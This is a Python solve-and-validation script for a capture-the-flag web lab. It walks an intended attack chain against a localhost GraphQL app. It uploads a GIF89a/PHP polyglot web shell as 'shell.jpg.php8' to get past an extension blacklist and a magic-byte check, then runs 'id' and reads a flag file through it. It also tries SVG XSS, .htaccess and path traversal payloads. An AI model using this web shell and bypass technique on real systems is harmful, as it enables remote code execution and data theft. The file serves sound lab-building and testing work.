#!/usr/bin/env python3
"""Automated solve and validation run for the SnapConnect lab.

AUTHOR TOOL (spoilers). This script walks the intended attack chain end to
end and asserts that every step behaves the way the challenge design says it
must. It also exercises the product features (register, profile, edit) so
regressions in the storefront show up alongside the security checks.

Usage:
    python3 ops/validate.py [base_url]     # default http://localhost:8081

Exit code 0 means every step passed, including flag retrieval.
"""

from __future__ import annotations

import hashlib
import json
import re
import secrets
import sys
import urllib.error
import urllib.request
import uuid
from pathlib import Path

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8081").rstrip("/")
LAB_YML = Path(__file__).resolve().parent.parent / "labs" / "web" / "snapconnect" / "lab.yml"

FLAG_RE = re.compile(r"^duck\{[a-z0-9_]{16,40}\}$")
GRAPHQL = f"{BASE}/graphql"

PASS = 0


def ok(label: str, detail: str = "") -> None:
    global PASS
    PASS += 1
    print(f"  [PASS] {label}" + (f" - {detail}" if detail else ""))


def fail(label: str, detail: str = "") -> None:
    print(f"  [FAIL] {label}" + (f" - {detail}" if detail else ""))
    print(f"solve aborted after {PASS} passing steps")
    sys.exit(1)


def check(label: str, condition: bool, detail: str = "") -> None:
    ok(label, detail) if condition else fail(label, detail)


def http(url: str, data: bytes | None = None, headers: dict | None = None,
         method: str | None = None) -> tuple[int, str]:
    request = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", "replace")


def http_raw(url: str, headers: dict | None = None) -> tuple[int, bytes]:
    request = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as error:
        return error.code, error.read()


def graphql(query: str, token: str | None = None, variables: dict | None = None) -> dict:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    payload = {"query": query}
    if variables is not None:
        payload["variables"] = variables
    status, body = http(GRAPHQL, json.dumps(payload).encode(), headers)
    if status != 200:
        raise RuntimeError(f"graphql returned {status}: {body[:200]}")
    return json.loads(body)


def upload(filename: str, content: bytes, token: str | None = None) -> dict:
    """Send one mutation per the graphql-multipart-request spec."""
    operations = json.dumps({
        "query": "mutation ($file: Upload!) { uploadAvatar(file: $file) { success url message } }",
        "variables": {"file": None},
    })
    boundary = f"----solve{uuid.uuid4().hex}"

    def part(headers: dict, payload: bytes | None = None) -> bytes:
        head = "".join(f"{key}: {value}\r\n" for key, value in headers.items())
        return (f"--{boundary}\r\n{head}\r\n".encode() + payload + b"\r\n") if payload is not None \
            else f"--{boundary}\r\n{head}\r\n\r\n".encode()

    body = b"".join([
        part({"Content-Disposition": 'form-data; name="operations"'}, operations.encode()),
        part({"Content-Disposition": 'form-data; name="map"'}, b'{"0": ["variables.file"]}'),
        part({
            "Content-Disposition": f'form-data; name="0"; filename="{filename}"',
            "Content-Type": "application/octet-stream",
        }, content),
        f"--{boundary}--\r\n".encode(),
    ])

    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    status, raw = http(GRAPHQL, body, headers)
    if status != 200:
        raise RuntimeError(f"upload returned {status}: {raw[:200]}")
    return json.loads(raw)


def error_message(result: dict) -> str:
    return result.get("errors", [{}])[0].get("message", "")


def flag_hash_from_lab_yml() -> str:
    text = LAB_YML.read_text()
    match = re.search(r"^flag_hash:\s*([0-9a-f]{64})\s*$", text, re.MULTILINE)
    if not match:
        raise RuntimeError(f"flag_hash missing in {LAB_YML}")
    return match.group(1)


PHP_SHELL = b'<?php system($_GET["cmd"]); ?>'
POLYGLOT = b"GIF89a" + PHP_SHELL


def main() -> None:
    print(f"SnapConnect automated solve against {BASE}")

    print("[phase 0] service availability")
    status, body = http(f"{BASE}/health.php")
    check("health endpoint reports ok", status == 200 and '"status":"ok"' in body)
    status, body = http(f"{BASE}/")
    check("portal page renders", status == 200 and "SnapConnect" in body)
    for page, title in (("/login.php", "Log in"), ("/register.php", "Join"), ("/profile.php", "Profile")):
        status, body = http(f"{BASE}{page}")
        check(f"{page} renders", status == 200 and title in body)
    status, body = http(f"{BASE}/docs")
    check("api docs page renders", status == 200 and "openapi.json" in body)
    status, body = http(f"{BASE}/openapi.json")
    spec = json.loads(body) if status == 200 else {}
    check("openapi document served", "/graphql" in spec.get("paths", {}))
    check("docs stay a neutral reference, no upload spotlight", "uploadAvatar" not in body and "multipart" not in body)

    print("[phase 1] recon through introspection")
    result = graphql("{ __schema { mutationType { fields { name } } } }")
    names = [field["name"] for field in result["data"]["__schema"]["mutationType"]["fields"]]
    check("register mutation discovered", "register" in names, f"mutations: {names}")
    check("uploadAvatar mutation discovered", "uploadAvatar" in names)
    result = graphql("{ __schema { queryType { fields { name } } } }")
    queries = [field["name"] for field in result["data"]["__schema"]["queryType"]["fields"]]
    check("user query discovered", "user" in queries, f"queries: {queries}")

    print("[phase 2] product features behave")
    handle = "tester_" + secrets.token_hex(4)
    password = "start-" + secrets.token_hex(8)
    result = graphql(
        "mutation ($u: String!, $e: String!, $p: String!) { register(username: $u, email: $e, password: $p) { token user { username } } }",
        variables={"u": handle, "e": f"{handle}@example.com", "p": password},
    )
    token = result["data"]["register"]["token"]
    check("register returns a session", bool(token))
    result = graphql(
        'mutation ($e: String!, $p: String!) { login(email: $e, password: $p) { token user { username } } }',
        variables={"e": f"{handle}@example.com", "p": password},
    )
    token = result["data"]["login"]["token"]
    check("login returns a bearer token", bool(token) and result["data"]["login"]["user"]["username"] == handle)
    result = graphql("{ me { username email avatarUrl } }", token)
    me = result["data"]["me"]
    check("me resolves for the token", me["username"] == handle and me["email"] == f"{handle}@example.com")
    result = graphql(
        'mutation { updateProfile(displayName: "Test Person", bio: "here for a moment") { displayName bio } }',
        token=token,
    )
    check("updateProfile persists", result["data"]["updateProfile"]["bio"] == "here for a moment")
    result = graphql(f'{{ user(username: "{handle}") {{ username bio email }} }}')
    check("public profile lookup works", result["data"]["user"]["bio"] == "here for a moment")
    check("email hidden on public profiles", result["data"]["user"]["email"] is None)
    result = graphql(f'mutation {{ register(username: "{handle}", email: "other@example.net", password: "password123") {{ token }} }}')
    check("duplicate usernames rejected", error_message(result) == "Username is taken.")
    result = graphql(f'mutation {{ register(username: "{handle}2", email: "bad", password: "password123") {{ token }} }}')
    check("invalid email rejected", error_message(result) == "Enter a valid email address.")

    print("[phase 3] seeded world looks alive")
    result = graphql('{ user(username: "casey") { username displayName avatarUrl } }')
    check("seeded public profile exists", result["data"]["user"]["avatarUrl"] == "/uploads/casey.png")
    status, raw = http_raw(f"{BASE}/uploads/casey.png")
    check("seeded avatar file is a real png", status == 200 and raw.startswith(b"\x89PNG"))

    print("[phase 4] probe the upload controls")
    result = upload("shell.php", PHP_SHELL, token)
    check("raw .php rejected by extension blacklist", error_message(result) == "File type not allowed.")
    result = upload("shell.phtml", POLYGLOT, token)
    check("polyglot .phtml rejected by extension blacklist", error_message(result) == "File type not allowed.")
    result = upload("shell.php8", PHP_SHELL, token)
    check(
        "raw .php8 passes blacklist, caught by magic-byte check",
        error_message(result) == "File does not look like an image.",
    )
    result = upload("evil.svg", b"<svg onload=alert(1)>", token)
    check("svg without image signature rejected", error_message(result) == "File does not look like an image.")

    png = bytes.fromhex(
        "89504e470d0a1a0a0000000d49484452000000010000000108020000009077"
        "53de0000000c4944415408d763f8cf00000301010018dd8db00000000049454e44ae426082"
    )
    result = upload("avatar.png", png, token)
    check("valid png upload succeeds", result["data"]["uploadAvatar"]["url"] == "/uploads/avatar.png")
    status, raw = http_raw(f"{BASE}/uploads/avatar.png")
    check("stored avatar served back", status == 200 and raw.startswith(b"\x89PNG"))

    print("[phase 5] craft and land the polyglot")
    result = upload("shell.jpg.php8", POLYGLOT, token)
    url = result.get("data", {}).get("uploadAvatar", {}).get("url", "")
    check("shell.jpg.php8 accepted", url == "/uploads/shell.jpg.php8")

    print("[phase 6] remote code execution")
    status, body = http(f"{BASE}/uploads/shell.jpg.php8?cmd=id")
    check("payload executes as the web server user", "uid=" in body and "www-data" in body, body.strip()[:60])

    status, body = http(f"{BASE}/uploads/shell.jpg.php8?cmd=cat%20%2Fvar%2Fwww%2Fflag.txt")
    match = re.search(r"duck\{[a-z0-9_]{16,40}\}", body)
    if not match or not FLAG_RE.fullmatch(match.group(0)):
        fail("flag readable through the payload", body.strip()[:80])
    flag = match.group(0)
    digest = hashlib.sha256(flag.encode()).hexdigest()
    expected = flag_hash_from_lab_yml()
    check("retrieved flag matches lab.yml flag_hash", digest == expected, f"sha256 {digest[:16]}...")

    print("[phase 7] no unintended shortcuts")
    status, _ = http(f"{BASE}/flag.txt")
    check("flag not reachable over http outside webroot", status == 404)
    status, _ = http(f"{BASE}/uploads/")
    check("uploads directory listing disabled", status in (403, 404))
    status, body = http(f"{BASE}/src/uploads.php")
    check("source directory not web accessible", status == 404)
    result = upload("shell.jpg.php8", POLYGLOT)
    check("upload without token rejected", error_message(result) == "Authentication required.")
    result = upload(".htaccess", b"GIF89aSetHandler none", token)
    check("dotfiles rejected by filename policy", error_message(result) == "Filename contains unsupported characters.")
    result = upload("../../escape.gif", POLYGLOT, token)
    check(
        "path traversal sanitized to basename",
        result.get("data", {}).get("uploadAvatar", {}).get("url") == "/uploads/escape.gif",
    )
    result = graphql("{ me { email } }", "not-a-real-token")
    check("bogus tokens do not authenticate", error_message(result) == "Authentication required.")

    print(f"solve complete: {PASS} checks passed, flag {flag[:5]}...{flag[-1]} verified")


if __name__ == "__main__":
    main()
